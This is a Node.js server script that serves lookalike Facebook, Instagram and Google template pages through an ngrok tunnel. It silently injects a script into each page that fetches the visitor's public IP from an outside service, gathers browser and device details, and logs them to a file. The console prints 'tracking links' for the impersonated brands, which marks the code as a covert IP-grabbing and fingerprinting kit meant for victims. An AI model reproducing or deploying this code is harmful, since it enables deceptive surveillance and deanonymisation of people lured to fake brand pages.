const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();

app.use(express.json());

// Create directories
if (!fs.existsSync('templates')) fs.mkdirSync('templates', { recursive: true });
if (!fs.existsSync('logs')) fs.mkdirSync('logs', { recursive: true });

// Better IP detection function
function getClientIP(req) {
    // Try different methods to get real IP
    return req.headers['x-forwarded-for'] || 
           req.headers['x-real-ip'] || 
           req.connection.remoteAddress || 
           req.socket.remoteAddress ||
           (req.connection.socket ? req.connection.socket.remoteAddress : null) ||
           'Unknown IP';
}

// Serve template pages
app.get('/template/:templateName', (req, res) => {
    const templateName = req.params.templateName;
    const templatePath = path.join(__dirname, 'templates', templateName, 'index.html');
    
    if (fs.existsSync(templatePath)) {
        let html = fs.readFileSync(templatePath, 'utf8');
        const sessionId = Date.now() + '-' + Math.random().toString(36).substr(2, 9);
        const clientIP = getClientIP(req);
        
        html = html.replace('</body>', `
            <script>
                // Get public IP using external service
                fetch('https://api.ipify.org?format=json')
                    .then(response => response.json())
                    .then(ipData => {
                        const deviceInfo = {
                            sessionId: '${sessionId}',
                            template: '${templateName}',
                            timestamp: new Date().toISOString(),
                            publicIP: ipData.ip,
                            localIP: '${clientIP}',
                            userAgent: navigator.userAgent,
                            browser: navigator.userAgent.includes('Chrome') ? 'Chrome' : 
                                     navigator.userAgent.includes('Firefox') ? 'Firefox' : 
                                     navigator.userAgent.includes('Safari') ? 'Safari' : 'Unknown',
                            screen: { width: screen.width, height: screen.height },
                            platform: navigator.platform,
                            language: navigator.language,
                            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                            cookies: navigator.cookieEnabled,
                            javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
                            pdfEnabled: navigator.pdfViewerEnabled
                        };
                        
                        console.log('Collected:', deviceInfo);
                        
                        fetch('/collect', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify(deviceInfo)
                        });
                    })
                    .catch(error => {
                        // Fallback if ipify fails
                        const deviceInfo = {
                            sessionId: '${sessionId}',
                            template: '${templateName}',
                            timestamp: new Date().toISOString(),
                            publicIP: 'Failed to get',
                            localIP: '${clientIP}',
                            userAgent: navigator.userAgent,
                            browser: navigator.userAgent.includes('Chrome') ? 'Chrome' : 
                                     navigator.userAgent.includes('Firefox') ? 'Firefox' : 
                                     navigator.userAgent.includes('Safari') ? 'Safari' : 'Unknown',
                            screen: { width: screen.width, height: screen.height },
                            platform: navigator.platform,
                            language: navigator.language,
                            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
                        };
                        
                        fetch('/collect', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify(deviceInfo)
                        });
                    });
            </script>
            </body>
        `);
        
        res.send(html);
    } else {
        res.send('Template not found: ' + templateName);
    }
});

// Data collection endpoint
app.post('/collect', (req, res) => {
    const data = req.body;
    const logEntry = `[${new Date().toISOString()}] ${data.sessionId} | Template: ${data.template} | Public IP: ${data.publicIP} | Local IP: ${data.localIP} | Browser: ${data.browser} | OS: ${data.platform} | Screen: ${data.screen.width}x${data.screen.height} | Language: ${data.language} | Timezone: ${data.timezone}\n`;
    
    fs.appendFileSync('logs/collected_data.txt', logEntry);
    console.log('📱 Data collected:');
    console.log('   Template:', data.template);
    console.log('   Public IP:', data.publicIP);
    console.log('   Local IP:', data.localIP);
    console.log('   Browser:', data.browser);
    console.log('   OS:', data.platform);
    console.log('   Screen:', data.screen.width + 'x' + data.screen.height);
    console.log('   ---');
    
    res.json({ status: 'success' });
});

app.listen(3000, () => {
    console.log('🚀 Server running on http://localhost:3000');
    console.log('');
    console.log('🎯 YOUR PUBLIC TRACKING LINKS:');
    console.log('   Facebook:   https://unlusting-shayla-hydromechanical.ngrok-free.dev/template/facebook');
    console.log('   Instagram:  https://unlusting-shayla-hydromechanical.ngrok-free.dev/template/instagram');
    console.log('   Google:     https://unlusting-shayla-hydromechanical.ngrok-free.dev/template/google');
    console.log('');
    console.log('📊 Monitor logs: tail -f logs/collected_data.txt');
    console.log('');
});
